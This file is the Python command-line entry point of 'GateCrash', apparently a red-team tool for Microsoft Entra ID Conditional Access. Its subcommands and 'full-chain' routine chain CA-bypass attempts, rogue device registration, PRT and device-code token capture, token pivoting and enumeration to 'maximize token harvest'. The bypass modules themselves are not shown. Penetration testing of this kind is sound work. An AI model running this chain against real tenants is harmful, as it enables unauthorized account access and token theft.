#!/usr/bin/env python3
"""GateCrash -- Entra ID Conditional Access assessment framework.

Each subcommand maps to a module. Modules chain via token/cert storage in the
engagement output directory (config: output_dir + engagement_name).

Usage:
  python cli.py recon      --config target.yaml
  python cli.py bypass     --config target.yaml [--method selenium-macos]
  python cli.py prt-flow   --config target.yaml [--resource graph]
  python cli.py drs        --config target.yaml
  python cli.py device-reg --config target.yaml
  python cli.py enumerate  --config target.yaml --token graph
  python cli.py import     --config target.yaml --token captured.json
  python cli.py report     --config target.yaml
  python cli.py auto       --config target.yaml
"""
import argparse
import sys

import config as config_mod
from lib.util import Engagement


def _engagement(cfg):
    return Engagement(cfg.output_dir, cfg.engagement_name)


def main(argv=None):
    p = argparse.ArgumentParser(prog="gatecrash", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    # Shared options accepted on every subcommand (so `cli.py recon --config x` works).
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("-c", "--config", required=True, help="path to config.yaml")
    common.add_argument("--resume", action="store_true", help="skip already-completed operations")
    sub = p.add_subparsers(dest="command", required=True)

    rc = sub.add_parser("recon", parents=[common], help="fingerprint CA policy across platforms x resources")
    rc.add_argument("--quick", action="store_true", help="trimmed probe (3 platforms x 1 client x 2 resources)")
    rc.add_argument("--sweep", action="store_true",
                    help="full CA-exemption resource sweep (~40 resources x baseline+bypass platforms)")
    rc.add_argument("--all-clients", dest="all_clients", action="store_true",
                    help="iterate the full client DB (catches special clients like company_portal)")

    b = sub.add_parser("bypass", parents=[common], help="platform CA bypass via Selenium or requests")
    b.add_argument("--method", default="selenium-macos",
                   choices=["selenium-macos", "selenium-ios", "selenium-android",
                            "requests-macos", "requests-ios", "requests-android"])

    pr = sub.add_parser("prt-flow", parents=[common], help="PRT broker auth -> token")
    pr.add_argument("--resource", default="drs", help="target resource name or URI")

    sub.add_parser("drs", parents=[common], help="get DRS token (CA-exempt, MFA only) + PATCH compliance")

    dr = sub.add_parser("device-reg", parents=[common], help="register a rogue device (native DRS) + PRT")
    dr.add_argument("--native", action="store_true", help="force native DRS registration")
    dr.add_argument("--device-name", dest="device_name", default=None, help="device display name")

    it = sub.add_parser("intune", parents=[common], help="Intune MDM enroll + SyncML checkin (pytune)")
    it.add_argument("--device-name", dest="device_name", default=None)

    si = sub.add_parser("syncml-intel", parents=[common], help="parse a SyncML checkin capture for corp intel")
    si.add_argument("--file", required=True, help="path to pytune checkin capture (txt/xml)")

    en = sub.add_parser("enumerate", parents=[common], help="enumerate with a stored/imported token")
    en.add_argument("--token", required=True, help="token id, filename, or path")

    im = sub.add_parser("import", parents=[common], help="import an external token (MadApe/roadtx/manual)")
    im.add_argument("--token", required=True, help="path to token JSON")

    dc = sub.add_parser("device-code", parents=[common],
                         help="device-code flow (user approves on another device, can bypass local CA)")
    dc.add_argument("--client", default="office", help="client app to use (default: office)")
    dc.add_argument("--scope", default="graph", help="target resource scope (default: graph)")
    sub.add_parser("tokens", parents=[common], help="list all captured tokens (for export to roadtx etc)")
    sub.add_parser("report", parents=[common], help="build CA matrix + findings report")
    sub.add_parser("auto", parents=[common], help="recon -> best bypass -> pivot -> enumerate all")

    fc = sub.add_parser("full-chain", parents=[common],
                        help="run the full chain: recon->drs->device-reg->prt->intune->bypass->enum")
    fc.add_argument("--resource", default="drs")
    fc.add_argument("--method", default=None, help="override bypass platform, e.g. selenium-ios")
    fc.add_argument("--device-name", dest="device_name", default=None)

    args = p.parse_args(argv)
    cfg = config_mod.load(args.config)
    eng = _engagement(cfg)

    from lib.logger import setup as setup_logging
    setup_logging(eng.root, verbose=cfg.verbose)

    # Lazy import so a missing optional dep (selenium) only bites the command that needs it.
    if args.command == "recon":
        from modules import recon
        recon.run(cfg, eng, args)
    elif args.command == "bypass":
        if getattr(args, "method", "").startswith("requests-"):
            from modules import requests_bypass
            requests_bypass.run(cfg, eng, args)
        else:
            from modules import platform_bypass
            platform_bypass.run(cfg, eng, args)
    elif args.command == "prt-flow":
        from modules import prt_broker
        prt_broker.run(cfg, eng, args)
    elif args.command == "drs":
        from modules import drs_ops
        drs_ops.run(cfg, eng, args)
    elif args.command == "device-reg":
        from modules import device_reg
        device_reg.run(cfg, eng, args)
    elif args.command == "enumerate":
        from modules import post_ex
        post_ex.run(cfg, eng, args)
    elif args.command == "import":
        from modules import token_ops
        token_ops.run_import(cfg, eng, args)
    elif args.command == "device-code":
        _device_code_flow(cfg, eng, args)
    elif args.command == "tokens":
        from modules import token_ops
        token_ops.run_list(cfg, eng, args)
    elif args.command == "intune":
        from modules import intune_ops
        intune_ops.run(cfg, eng, args)
    elif args.command == "syncml-intel":
        from modules import post_ex
        post_ex.run_syncml_intel(cfg, eng, args)
    elif args.command == "report":
        from modules import reporting
        reporting.run(cfg, eng, args)
    elif args.command == "auto":
        _auto(cfg, eng, args)
    elif args.command == "full-chain":
        _full_chain(cfg, eng, args)


def _device_code_flow(cfg, eng, args):
    """Device-code auth: user approves on another device. Bypasses local CA on some tenants."""
    import time
    from lib import clients as cl
    from lib.logger import logged_session, get as get_log
    from lib.oauth import device_code_start, device_code_poll
    from lib.util import decode_jwt
    from modules.token_ops import store_token, pivot_all

    log = get_log()
    cid = cl.client_id(args.client)
    scope = cl.v2_scope(args.scope, cfg.sharepoint_host)
    session = logged_session("device-code")

    log.info(f"[device-code] Starting device-code flow (client={args.client}, scope={args.scope})")
    status, body = device_code_start(session, cid, scope, cfg.tenant_id)
    if status != 200 or not body.get("user_code"):
        raise SystemExit(f"[device-code] Device code request failed: {body.get('error_description', body)}")

    user_code = body["user_code"]
    device_code = body["device_code"]
    verify_url = body.get("verification_uri", "https://microsoft.com/devicelogin")
    interval = body.get("interval", 5)
    expires_in = body.get("expires_in", 900)

    print(f"\n{'=' * 60}")
    print(f"  DEVICE CODE AUTH")
    print(f"  Go to:  {verify_url}")
    print(f"  Enter:  {user_code}")
    print(f"  Expires in {expires_in}s")
    print(f"{'=' * 60}\n", flush=True)

    log.info(f"[device-code] Polling for approval (every {interval}s, timeout {expires_in}s)...")
    for i in range(expires_in // interval):
        time.sleep(interval)
        s, tok = device_code_poll(session, cid, device_code, cfg.tenant_id)
        if "access_token" in tok:
            claims = decode_jwt(tok["access_token"])
            log.info(f"[device-code] APPROVED! Token received.")
            log.info(f"[device-code]   Audience:  {claims.get('aud')}")
            log.info(f"[device-code]   UPN:       {claims.get('upn')}")
            log.info(f"[device-code]   Scopes:    {claims.get('scp', 'N/A')}")
            saved = store_token(eng, args.scope, tok, cfg, source="gatecrash",
                                meta={"method": "device-code", "client": args.client})
            log.info(f"[device-code]   Saved to:  {saved}")
            pivot_all(cfg, eng, args.scope)
            return
        err = tok.get("error", "")
        if err == "authorization_pending":
            if i % 6 == 0:
                print(f"[device-code] Waiting for approval... ({i * interval}s)", flush=True)
        elif err == "expired_token":
            raise SystemExit("[device-code] Device code expired. Run again.")
        elif err == "authorization_declined":
            raise SystemExit("[device-code] User declined authorization.")
        else:
            log.info(f"[device-code] Poll: {err} {tok.get('error_description', '')[:100]}")
    raise SystemExit("[device-code] Timed out waiting for approval.")


def _auto(cfg, eng, args):
    """recon -> pick best bypass -> pivot all -> enumerate all. Maximizes token harvest."""
    from modules import recon, platform_bypass, post_ex, reporting, token_ops

    print("[auto] === Phase 1: Recon ===")
    result = recon.run(cfg, eng, args)

    if result.get("direct_token"):
        print("[auto] Direct token(s) from recon. Attempting pivot to all resources...")
        # Pivot any token that has a refresh_token
        for name in ("graph", "drs", "exchange", "azure_mgmt"):
            token_ops.pivot_all(cfg, eng, name)

    if result.get("bypass_platforms"):
        plat = result["bypass_platforms"][0]
        print(f"\n[auto] === Phase 2: Platform bypass ({plat}) ===")
        try:
            import selenium  # noqa: F401
            args.method = f"selenium-{plat}"
            platform_bypass.run(cfg, eng, args)
        except ImportError:
            from modules import requests_bypass
            args.method = f"requests-{plat}"
            requests_bypass.run(cfg, eng, args)
    elif not result.get("direct_token"):
        print("[auto] No platform bypass and no direct tokens.")
        if result.get("device_code_allowed"):
            print("[auto] Device-code flow IS allowed. Run: device-code --config <cfg>")
        print("[auto] Also try: drs / device-reg / prt-flow / full-chain")
        reporting.run(cfg, eng, args)
        return

    # Pivot any new tokens we got from bypass
    for name in ("graph", "exchange", "sharepoint", "azure_mgmt"):
        token_ops.pivot_all(cfg, eng, name)

    # Enumerate with every usable token
    print("\n[auto] === Phase 3: Enumerate with all tokens ===")
    token_ops.enumerate_all(cfg, eng)

    print("\n[auto] === Phase 4: Report ===")
    reporting.run(cfg, eng, args)
    token_ops.run_list(cfg, eng, args)


def _full_chain(cfg, eng, args):
    """The complete Azure CA bypass chain, end to end, with decision points.

    Maximizes token harvest: every step that yields tokens pivots them to all resources,
    and at the end we enumerate with every token we have.
    """
    from modules import recon, drs_ops, device_reg, intune_ops, platform_bypass, post_ex, reporting, token_ops

    print("\n########## STEP 1-2: Recon (creds + CA fingerprint) ##########")
    summary = recon.run(cfg, eng, args)

    if summary.get("invalid_creds"):
        print("[chain] Credentials invalid. Stopping.")
        reporting.run(cfg, eng, args)
        return

    # Pivot any direct tokens from recon
    if summary.get("direct_token"):
        print("\n[chain] Pivoting recon tokens...")
        for name in ("graph", "drs", "exchange"):
            token_ops.pivot_all(cfg, eng, name)

    print("\n########## STEP 3: DRS token (CA-exempt) ##########")
    try:
        drs_ops.run(cfg, eng, args)
    except SystemExit as e:
        print(f"[chain] DRS step incomplete: {e}")

    if eng.load_token("drs"):
        print("\n########## STEP 4-5: Rogue device registration + PRT ##########")
        try:
            device_reg.run(cfg, eng, args)
        except SystemExit as e:
            print(f"[chain] device-reg incomplete: {e}")

        # If device-reg got a PRT and roadtx produced tokens, pivot them
        for name in ("graph", "drs"):
            token_ops.pivot_all(cfg, eng, name)

        print("\n########## STEP 8-10: Intune MDM enroll + SyncML intel ##########")
        try:
            intune_ops.run(cfg, eng, args)
        except SystemExit as e:
            print(f"[chain] intune incomplete: {e}")
    else:
        print("[chain] No DRS token (needs MFA/PRT on this host); skipping device-reg/intune.")

    # The headline bypass. Pick the platform recon flagged.
    plats = summary.get("bypass_platforms") or []
    if args.method or plats:
        method = args.method or f"selenium-{plats[0]}"
        print(f"\n########## STEP 11-12: Platform bypass ({method}) -> Graph ##########")
        args.method = method
        try:
            if method.startswith("requests-"):
                from modules import requests_bypass
                requests_bypass.run(cfg, eng, args)
            else:
                try:
                    platform_bypass.run(cfg, eng, args)
                except ImportError:
                    print("[chain] Selenium not available; falling back to requests-only bypass.")
                    args.method = method.replace("selenium-", "requests-")
                    from modules import requests_bypass
                    requests_bypass.run(cfg, eng, args)
        except SystemExit as e:
            print(f"[chain] bypass incomplete: {e}")
    else:
        print("[chain] No platform bypass found in recon; skipping Selenium step.")

    # Final pivot: maximize coverage from whatever tokens we have
    print("\n########## PIVOT: Maximize resource coverage ##########")
    for name in ("graph", "exchange", "sharepoint", "azure_mgmt", "drs"):
        token_ops.pivot_all(cfg, eng, name)

    # Enumerate with everything
    print("\n########## ENUMERATE: All available tokens ##########")
    token_ops.enumerate_all(cfg, eng)

    print("\n########## FINAL: Report ##########")
    reporting.run(cfg, eng, args)

    print("\n########## TOKEN INVENTORY (for external tools) ##########")
    token_ops.run_list(cfg, eng, args)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Progress saved to output dir.")
        sys.exit(130)
